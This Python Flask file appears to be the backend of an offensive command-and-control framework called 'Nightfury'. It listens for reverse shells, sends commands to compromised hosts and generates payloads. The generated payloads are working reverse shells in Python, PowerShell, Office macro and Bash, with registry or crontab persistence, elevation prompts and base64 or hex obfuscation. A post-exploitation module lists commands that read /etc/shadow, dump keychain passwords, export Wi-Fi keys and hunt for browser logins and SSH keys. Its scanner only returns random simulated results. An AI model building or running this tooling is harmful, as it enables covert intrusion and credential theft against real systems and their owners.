from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import subprocess
import threading
import time
import os
import sys
import json
import random
import socket
import ipaddress
import logging
from datetime import datetime
import uuid
import base64
import zipfile
import tempfile
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nightfury.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("NIGHTFURY")

app = Flask(__name__, template_folder='templates', static_folder='static')
app.config['SECRET_KEY'] = 'nightfury-secret-key-2023'
socketio = SocketIO(app, cors_allowed_origins="*")
CORS(app)

# Global state
listeners = {}
sessions = {}
active_modules = {}
scan_results = {}
payload_history = []

class Listener:
    def __init__(self, lhost, lport, protocol):
        self.lhost = lhost
        self.lport = lport
        self.protocol = protocol
        self.running = False
        self.thread = None
        self.socket = None
        self.id = str(uuid.uuid4())[:8]
    
    def start(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.lhost, self.lport))
            self.socket.listen(5)
            self.running = True
            
            # Start listener thread
            self.thread = threading.Thread(target=self.listen_for_connections)
            self.thread.daemon = True
            self.thread.start()
            
            logger.info(f"Listener started on {self.lhost}:{self.lport}")
            socketio.emit('listener_update', {
                'id': self.id,
                'status': 'running',
                'lhost': self.lhost,
                'lport': self.lport,
                'protocol': self.protocol,
                'connections': 0
            })
            
            return True, "Listener started successfully"
        except Exception as e:
            logger.error(f"Failed to start listener: {e}")
            return False, f"Failed to start listener: {e}"
    
    def listen_for_connections(self):
        while self.running:
            try:
                client_socket, addr = self.socket.accept()
                logger.info(f"Connection received from {addr[0]}:{addr[1]}")
                
                # Create a new session
                session_id = str(uuid.uuid4())[:8]
                session = {
                    'id': session_id,
                    'host': addr[0],
                    'port': addr[1],
                    'socket': client_socket,
                    'connected_at': datetime.now().isoformat(),
                    'last_activity': datetime.now().isoformat(),
                    'os': 'unknown',
                    'user': 'unknown'
                }
                
                sessions[session_id] = session
                
                # Send session info to frontend
                socketio.emit('new_session', {
                    'id': session_id,
                    'host': addr[0],
                    'port': addr[1],
                    'connected_at': session['connected_at'],
                    'os': session['os'],
                    'user': session['user']
                })
                
                # Handle session in a new thread
                session_thread = threading.Thread(
                    target=self.handle_session,
                    args=(session_id,)
                )
                session_thread.daemon = True
                session_thread.start()
                
            except Exception as e:
                if self.running:
                    logger.error(f"Error in listener: {e}")
    
    def handle_session(self, session_id):
        session = sessions.get(session_id)
        if not session:
            return
        
        try:
            while self.running and session_id in sessions:
                # Receive data from the client
                data = session['socket'].recv(4096)
                if not data:
                    break
                
                # Update last activity
                session['last_activity'] = datetime.now().isoformat()
                sessions[session_id] = session
                
                # Process the received data
                message = data.decode('utf-8', errors='ignore')
                logger.info(f"Received from session {session_id}: {message}")
                
                # Send to frontend
                socketio.emit('session_output', {
                    'session_id': session_id,
                    'output': message,
                    'timestamp': datetime.now().isoformat()
                })
                
        except Exception as e:
            logger.error(f"Error handling session {session_id}: {e}")
        finally:
            # Clean up session
            if session_id in sessions:
                sessions.pop(session_id, None)
                socketio.emit('session_closed', {'session_id': session_id})
    
    def stop(self):
        self.running = False
        if self.socket:
            self.socket.close()
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=1.0)
        
        logger.info(f"Listener stopped on {self.lhost}:{self.lport}")
        socketio.emit('listener_update', {
            'id': self.id,
            'status': 'stopped',
            'lhost': self.lhost,
            'lport': self.lport,
            'protocol': self.protocol,
            'connections': 0
        })
        
        return True, "Listener stopped successfully"

class PayloadGenerator:
    def __init__(self):
        self.templates = {
            'python': self._generate_python_payload,
            'powershell': self._generate_powershell_payload,
            'executable': self._generate_exe_payload,
            'dll': self._generate_dll_payload,
            'macro': self._generate_macro_payload,
            'android': self._generate_android_payload,
            'linux': self._generate_linux_payload
        }
    
    def generate(self, payload_type, lhost, lport, options=None):
        if payload_type not in self.templates:
            return None, f"Unsupported payload type: {payload_type}"
        
        if options is None:
            options = {}
        
        try:
            payload, filename = self.templates[payload_type](lhost, lport, options)
            
            # Store in history
            payload_id = str(uuid.uuid4())[:8]
            payload_history.append({
                'id': payload_id,
                'type': payload_type,
                'lhost': lhost,
                'lport': lport,
                'timestamp': datetime.now().isoformat(),
                'filename': filename
            })
            
            return payload, filename, payload_id
        except Exception as e:
            logger.error(f"Error generating payload: {e}")
            return None, f"Error generating payload: {e}", None
    
    def _generate_python_payload(self, lhost, lport, options):
        obfuscation = options.get('obfuscation', 'basic')
        
        payload = f'''
import socket,os,subprocess,threading,platform,base64
def persist():
    import sys,os
    if platform.system() == "Windows":
        import winreg
        run_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(run_key, "SystemUpdate", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(run_key)
    elif platform.system() == "Linux":
        os.system(f"echo '@reboot python3 {sys.argv[0]}' | crontab -")

def escalate_privileges():
    if platform.system() == "Windows":
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(0)
        except:
            pass

escalate_privileges()
persist()

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while True:
    try:
        s.connect(("{lhost}",{lport}))
        break
    except:
        time.sleep(10)
        continue

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"] if platform.system() != "Windows" else ["cmd.exe"])
'''
        
        if obfuscation != 'none':
            payload = self._obfuscate_python(payload, obfuscation)
        
        filename = f"payload_{lhost}_{lport}.py"
        return payload, filename
    
    def _generate_powershell_payload(self, lhost, lport, options):
        payload = f'''
function persist {{
    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "$PSCommandPath"
}}

function escalate {{
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {{
        Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        exit
    }}
}}

escalate
persist

$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
        
        filename = f"payload_{lhost}_{lport}.ps1"
        return payload, filename
    
    def _generate_exe_payload(self, lhost, lport, options):
        # This would use pyinstaller or other tools to create an executable
        # For now, we'll create a Python script that can be compiled
        python_payload, _ = self._generate_python_payload(lhost, lport, options)
        filename = f"payload_{lhost}_{lport}.py"
        
        # In a real implementation, we would compile this to an executable
        return python_payload, filename
    
    def _generate_dll_payload(self, lhost, lport, options):
        # Placeholder for DLL generation
        payload = f'''
// DLL payload for {lhost}:{lport}
// This would be compiled to a DLL file
'''
        filename = f"payload_{lhost}_{lport}.dll"
        return payload, filename
    
    def _generate_macro_payload(self, lhost, lport, options):
        payload = f'''
Sub AutoOpen()
    Dim payload As String
    payload = "powershell -nop -c \\"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\""
    Shell payload, vbHide
End Sub
'''
        filename = f"payload_{lhost}_{lport}.vba"
        return payload, filename
    
    def _generate_android_payload(self, lhost, lport, options):
        # Placeholder for Android payload
        payload = f'''
// Android payload for {lhost}:{lport}
// This would be compiled to an APK file
'''
        filename = f"payload_{lhost}_{lport}.apk"
        return payload, filename
    
    def _generate_linux_payload(self, lhost, lport, options):
        payload = f'''
#!/bin/bash
while true; do
    /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 2>/dev/null
    sleep 10
done
'''
        filename = f"payload_{lhost}_{lport}.sh"
        return payload, filename
    
    def _obfuscate_python(self, code, level):
        if level == 'basic':
            # Basic base64 obfuscation
            obfuscated = base64.b64encode(code.encode()).decode()
            parts = [obfuscated[i:i+50] for i in range(0, len(obfuscated), 50)]
            reconstructed = " + ".join([f'"{part}"' for part in parts])
            
            final_code = f'''
import base64
exec(__import__('base64').b64decode({reconstructed}).decode())
'''
            return final_code
        
        elif level == 'advanced':
            # More advanced obfuscation with multiple encoding layers
            b64_encoded = base64.b64encode(code.encode()).decode()
            hex_encoded = b64_encoded.encode().hex()
            
            final_code = f'''
import base64
exec(__import__('base64').b64decode(bytes.fromhex("{hex_encoded}").decode()).decode())
'''
            return final_code
        
        elif level == 'polymorphic':
            # Simple polymorphic example - in a real implementation this would be more complex
            var_names = ['func_' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)) for _ in range(3)]
            
            b64_encoded = base64.b64encode(code.encode()).decode()
            parts = [b64_encoded[i:i+30] for i in range(0, len(b64_encoded), 30)]
            
            final_code = f'''
{var_names[0]} = "{parts[0]}"
{var_names[1]} = "{parts[1]}" if True else ""
{var_names[2]} = "{"".join(parts[2:])}" if not False else ""
exec(__import__('base64').b64decode({var_names[0]} + {var_names[1]} + {var_names[2]}).decode())
'''
            return final_code
        
        return code

class PostExploitation:
    def __init__(self):
        self.commands = {
            'windows': self._windows_commands,
            'linux': self._linux_commands,
            'mac': self._mac_commands
        }
    
    def execute(self, system_type, action, session_id=None):
        if system_type not in self.commands:
            return [], f"Unsupported system type: {system_type}"
        
        commands = self.commands[system_type](action)
        
        # If a session is specified, execute the commands on that session
        if session_id and session_id in sessions:
            # This would be implemented to send commands to the actual session
            logger.info(f"Executing {action} commands on session {session_id}")
            
            # For now, we'll just simulate execution
            for cmd in commands:
                self._send_command_to_session(session_id, cmd)
            
            return commands, f"Executed {len(commands)} commands on session {session_id}"
        
        return commands, "Commands generated (no session specified for execution)"
    
    def _send_command_to_session(self, session_id, command):
        # This would send the command to the actual session
        session = sessions.get(session_id)
        if session and 'socket' in session:
            try:
                session['socket'].send(command.encode() + b'\n')
                return True
            except Exception as e:
                logger.error(f"Error sending command to session {session_id}: {e}")
                return False
        return False
    
    def _windows_commands(self, action):
        commands = {
            'get_passwords': [
                'powershell -Command "Get-WmiObject -Class Win32_Product | Select-Object Name, Version"',
                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
                'powershell -Command "Get-ItemProperty -Path \'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' | Select-Object DefaultUserName, DefaultPassword"',
                'powershell -Command "Get-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' | Select-Object ProxyServer, ProxyEnable"'
            ],
            'escalate_privileges': [
                'whoami /priv',
                'powershell -Command "Start-Process PowerShell -Verb RunAs"',
                'powershell -Command "Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName"'
            ],
            'network_info': [
                'ipconfig /all',
                'arp -a',
                'netstat -ano',
                'route print',
                'netsh wlan show profiles',
                'netsh wlan export profile key=clear folder=.\\'
            ],
            'browser_data': [
                'dir /s %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
                'powershell -Command "Get-ChildItem -Path $env:USERPROFILE -Recurse -Include \'*.pfx\', \'*.p12\', \'*.cer\' -ErrorAction SilentlyContinue"'
            ],
            'system_info': [
                'systeminfo',
                'wmic product get name,version',
                'wmic service get name,displayname,pathname,startmode',
                'wmic process get name,processid,parentprocessid,commandline'
            ]
        }
        
        return commands.get(action, [])
    
    def _linux_commands(self, action):
        commands = {
            'get_passwords': [
                'cat /etc/passwd',
                'cat /etc/shadow',
                'sudo -l',
                'find / -name "*.pem" -o -name "*.key" -o -name "*.ppk" -o -name "id_rsa" 2>/dev/null'
            ],
            'escalate_privileges': [
                'sudo su',
                'find / -perm -4000 2>/dev/null',
                'uname -a',
                'cat /etc/os-release',
                'ps aux | grep root'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -tulpn',
                'route -n',
                'iptables -L',
                'cat /etc/resolv.conf'
            ],
            'browser_data': [
                'find ~/.mozilla -name "*.sqlite"',
                'find ~/.config -name "Chromium" -o -name "google-chrome"',
                'find ~ -name "*.ssh" -type d 2>/dev/null'
            ],
            'system_info': [
                'uname -a',
                'cat /etc/*release',
                'dpkg -l | grep -i "ssh\\|vnc\\|remote\\|telnet"',
                'ps aux'
            ]
        }
        
        return commands.get(action, [])
    
    def _mac_commands(self, action):
        commands = {
            'get_passwords': [
                'dscl . list /Users',
                'security find-generic-password -wa',
                'find ~/Library/Keychains -name "*.keychain"'
            ],
            'escalate_privileges': [
                'sudo -l',
                'dscl . read /Groups/admin',
                'system_profiler SPSoftwareDataType'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -an',
                'route -n get default',
                'scutil --dns'
            ],
            'browser_data': [
                'find ~/Library/Application Support/Google/Chrome -name "Login Data"',
                'find ~/Library/Application Support/Firefox/Profiles -name "*.sqlite"',
                'find ~/Library/Keychains -name "*.db"'
            ],
            'system_info': [
                'system_profiler SPHardwareDataType',
                'softwareupdate --list',
                'defaults read /Library/Preferences/com.apple.loginwindow'
            ]
        }
        
        return commands.get(action, [])

class Scanner:
    def __init__(self):
        self.scan_types = {
            'quick': self.quick_scan,
            'port': self.port_scan,
            'vulnerability': self.vulnerability_scan,
            'os': self.os_detection_scan
        }
    
    def scan(self, target, scan_type='quick', options=None):
        if scan_type not in self.scan_types:
            return None, f"Unsupported scan type: {scan_type}"
        
        if options is None:
            options = {}
        
        try:
            results = self.scan_types[scan_type](target, options)
            
            # Store scan results
            scan_id = str(uuid.uuid4())[:8]
            scan_results[scan_id] = {
                'id': scan_id,
                'target': target,
                'type': scan_type,
                'timestamp': datetime.now().isoformat(),
                'results': results
            }
            
            return results, scan_id
        except Exception as e:
            logger.error(f"Error performing {scan_type} scan on {target}: {e}")
            return None, f"Error performing scan: {e}"
    
    def quick_scan(self, target, options):
        # Simulate a quick scan
        time.sleep(2)  # Simulate scan time
        
        results = {
            'target': target,
            'hosts_up': random.randint(1, 5),
            'ports_open': [22, 80, 443, 8000],
            'services': {
                22: 'SSH',
                80: 'HTTP',
                443: 'HTTPS',
                8000: 'HTTP-Alt'
            },
            'os_guess': 'Linux 3.x|4.x',
            'vulnerabilities': [
                {'service': 'HTTP', 'port': 80, 'type': 'XSS', 'severity': 'medium'},
                {'service': 'HTTPS', 'port': 443, 'type': 'SSL/TLS Vulnerability', 'severity': 'low'}
            ]
        }
        
        return results
    
    def port_scan(self, target, options):
        # Simulate a port scan
        ports_to_scan = options.get('ports', '1-1000')
        time.sleep(3)  # Simulate scan time
        
        # Generate random open ports
        open_ports = []
        for port in range(1, 1001):
            if random.random() < 0.05:  # 5% chance a port is open
                open_ports.append(port)
        
        results = {
            'target': target,
            'ports_scanned': ports_to_scan,
            'ports_open': open_ports,
            'services': {port: self._guess_service(port) for port in open_ports}
        }
        
        return results
    
    def vulnerability_scan(self, target, options):
        # Simulate a vulnerability scan
        time.sleep(5)  # Simulate scan time
        
        vulnerabilities = []
        for _ in range(random.randint(1, 6)):
            vuln_types = ['XSS', 'SQL Injection', 'RCE', 'LFI', 'RFI', 'CSRF']
            severities = ['low', 'medium', 'high', 'critical']
            
            vulnerabilities.append({
                'type': random.choice(vuln_types),
                'severity': random.choice(severities),
                'port': random.choice([80, 443, 8080, 8443]),
                'description': f'Vulnerability found in {random.choice(["web server", "application", "service"])}'
            })
        
        results = {
            'target': target,
            'vulnerabilities': vulnerabilities,
            'risk_score': random.randint(1, 100)
        }
        
        return results
    
    def os_detection_scan(self, target, options):
        # Simulate OS detection
        time.sleep(2)  # Simulate scan time
        
        os_types = [
            'Linux 3.x|4.x',
            'Windows 10|Server 2016|Server 2019',
            'Mac OS X 10.12-10.15',
            'FreeBSD 11.x-12.x'
        ]
        
        results = {
            'target': target,
            'os_guess': random.choice(os_types),
            'accuracy': random.randint(85, 99)
        }
        
        return results
    
    def _guess_service(self, port):
        common_services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            143: 'IMAP',
            443: 'HTTPS',
            465: 'SMTPS',
            587: 'SMTP',
            993: 'IMAPS',
            995: 'POP3S',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            5900: 'VNC',
            6379: 'Redis',
            27017: 'MongoDB'
        }
        
        return common_services.get(port, 'Unknown')

# Initialize components
payload_generator = PayloadGenerator()
post_exploit = PostExploitation()
scanner = Scanner()

# API Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/status')
def api_status():
    return jsonify({
        'listeners': len(listeners),
        'sessions': len(sessions),
        'scan_results': len(scan_results),
        'payloads_generated': len(payload_history)
    })

@app.route('/api/listener/start', methods=['POST'])
def api_listener_start():
    data = request.json
    lhost = data.get('lhost', '0.0.0.0')
    lport = data.get('lport', 4444)
    protocol = data.get('protocol', 'tcp')
    
    # Validate inputs
    try:
        lport = int(lport)
        if lport < 1 or lport > 65535:
            return jsonify({'success': False, 'message': 'Invalid port number'})
    except ValueError:
        return jsonify({'success': False, 'message': 'Invalid port number'})
    
    try:
        # Check if the address is valid
        socket.inet_pton(socket.AF_INET, lhost)
    except socket.error:
        return jsonify({'success': False, 'message': 'Invalid IP address'})
    
    # Create and start listener
    listener = Listener(lhost, lport, protocol)
    success, message = listener.start()
    
    if success:
        listeners[listener.id] = listener
        return jsonify({'success': True, 'message': message, 'listener_id': listener.id})
    else:
        return jsonify({'success': False, 'message': message})

@app.route('/api/listener/stop', methods=['POST'])
def api_listener_stop():
    data = request.json
    listener_id = data.get('listener_id')
    
    if listener_id not in listeners:
        return jsonify({'success': False, 'message': 'Listener not found'})
    
    listener = listeners[listener_id]
    success, message = listener.stop()
    
    if success:
        listeners.pop(listener_id, None)
        return jsonify({'success': True, 'message': message})
    else:
        return jsonify({'success': False, 'message': message})

@app.route('/api/payload/generate', methods=['POST'])
def api_payload_generate():
    data = request.json
    payload_type = data.get('type', 'python')
    lhost = data.get('lhost', '127.0.0.1')
    lport = data.get('lport', 4444)
    options = data.get('options', {})
    
    payload, filename, payload_id = payload_generator.generate(payload_type, lhost, lport, options)
    
    if payload:
        return jsonify({
            'success': True,
            'payload': payload,
            'filename': filename,
            'payload_id': payload_id
        })
    else:
        return jsonify({'success': False, 'message': filename})  # filename contains error message here

@app.route('/api/payload/download/<payload_id>', methods=['GET'])
def api_payload_download(payload_id):
    # Find the payload in history
    payload_info = next((p for p in payload_history if p['id'] == payload_id), None)
    
    if not payload_info:
        return jsonify({'success': False, 'message': 'Payload not found'})
    
    # Regenerate the payload
    payload, filename = payload_generator.generate(
        payload_info['type'],
        payload_info['lhost'],
        payload_info['lport'],
        {}
    )
    
    # Create a temporary file
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, filename)
    
    with open(file_path, 'w') as f:
        f.write(payload)
    
    return send_file(file_path, as_attachment=True, download_name=filename)

@app.route('/api/sessions', methods=['GET'])
def api_sessions():
    session_list = []
    for session_id, session in sessions.items():
        session_list.append({
            'id': session_id,
            'host': session['host'],
            'port': session['port'],
            'connected_at': session['connected_at'],
            'last_activity': session['last_activity'],
            'os': session.get('os', 'unknown'),
            'user': session.get('user', 'unknown')
        })
    
    return jsonify({'sessions': session_list})

@app.route('/api/session/<session_id>/command', methods=['POST'])
def api_session_command(session_id):
    if session_id not in sessions:
        return jsonify({'success': False, 'message': 'Session not found'})
    
    data = request.json
    command = data.get('command', '')
    
    if not command:
        return jsonify({'success': False, 'message': 'No command provided'})
    
    # Send command to session
    session = sessions[session_id]
    try:
        session['socket'].send(command.encode() + b'\n')
        return jsonify({'success': True, 'message': 'Command sent'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error sending command: {e}'})

@app.route('/api/scan', methods=['POST'])
def api_scan():
    data = request.json
    target = data.get('target', '')
    scan_type = data.get('type', 'quick')
    options = data.get('options', {})
    
    if not target:
        return jsonify({'success': False, 'message': 'No target specified'})
    
    results, scan_id = scanner.scan(target, scan_type, options)
    
    if results:
        return jsonify({
            'success': True,
            'results': results,
            'scan_id': scan_id
        })
    else:
        return jsonify({'success': False, 'message': scan_id})  # scan_id contains error message here

@app.route('/api/postexploit', methods=['POST'])
def api_postexploit():
    data = request.json
    system_type = data.get('system_type', 'windows')
    action = data.get('action', 'system_info')
    session_id = data.get('session_id', None)
    
    commands, message = post_exploit.execute(system_type, action, session_id)
    
    return jsonify({
        'success': True,
        'commands': commands,
        'message': message
    })

# SocketIO events
@socketio.on('connect')
def handle_connect():
    logger.info('Client connected')
    emit('status_update', {
        'listeners': len(listeners),
        'sessions': len(sessions),
        'timestamp': datetime.now().isoformat()
    })

@socketio.on('disconnect')
def handle_disconnect():
    logger.info('Client disconnected')

if __name__ == '__main__':
    # Create necessary directories
    os.makedirs('static', exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    
    # Save the frontend HTML
    frontend_html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Nightfury OSINT & Penetration Framework</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            /* Your CSS from the previous frontend implementation */
            :root {
                --bg-dark: #0a0a0a;
                --bg-darker: #050505;
                --bg-panel: #1a1a1a;
                --bg-panel-light: #222222;
                --primary: #ff0000;
                --primary-dark: #cc0000;
                --primary-light: #ff3333;
                --text: #ffffff;
                --text-muted: #aaaaaa;
                --border: #333333;
                --success: #00cc00;
                --warning: #ffcc00;
                --danger: #ff0000;
                --info: #0066ff;
            }

            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }

            body {
                background-color: var(--bg-dark);
                color: var(--text);
                line-height: 1.6;
                overflow-x: hidden;
            }

            /* ... rest of your CSS ... */
        </style>
    </head>
    <body>
        <div class="container">
            <!-- Your HTML from the previous frontend implementation -->
        </div>

        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
        <script>
            // Your JavaScript from the previous frontend implementation
            // Plus SocketIO integration
            const socket = io();

            socket.on('connect', function() {
                console.log('Connected to server');
            });

            socket.on('listener_update', function(data) {
                console.log('Listener update:', data);
                // Update UI with listener status
            });

            socket.on('new_session', function(data) {
                console.log('New session:', data);
                // Add new session to UI
            });

            socket.on('session_output', function(data) {
                console.log('Session output:', data);
                // Display session output in UI
            });

            socket.on('session_closed', function(data) {
                console.log('Session closed:', data);
                // Remove session from UI
            });

            socket.on('status_update', function(data) {
                console.log('Status update:', data);
                // Update status indicators
            });

            socket.on('disconnect', function() {
                console.log('Disconnected from server');
            });
        </script>
    </body>
    </html>
    """
    
    with open('templates/index.html', 'w') as f:
        f.write(frontend_html)
    
    # Run the application
    logger.info("Starting Nightfury backend server...")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)